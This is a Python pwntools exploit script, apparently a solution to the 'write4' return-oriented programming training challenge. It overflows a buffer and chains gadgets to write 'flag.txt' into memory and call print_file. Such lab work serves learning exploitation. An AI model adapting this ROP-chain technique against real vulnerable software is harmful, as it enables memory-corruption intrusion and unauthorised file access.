#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write4')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./write4_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616b)

# ROPgadget --binary write4
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400693 : pop rdi ; ret
MOV_MEM = p64(0x400628)
POP_R14_R15 = p64(0x400690)
POP_RDI = p64(0x400693)

# (r2) iS - to print sections adresses 
DATA_ADDR = p64(0x601028)

# "flag.txt" string
FLAG_STR = p64(int.from_bytes(b"flag.txt", 'little'))

# (r2) aaa; afl
# 0x00400510    1      6 sym.imp.print_file
PR_FILE = p64(0x400510)

payload = padding
payload += POP_R14_R15 + DATA_ADDR + FLAG_STR + MOV_MEM
payload += POP_RDI + DATA_ADDR + PR_FILE

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
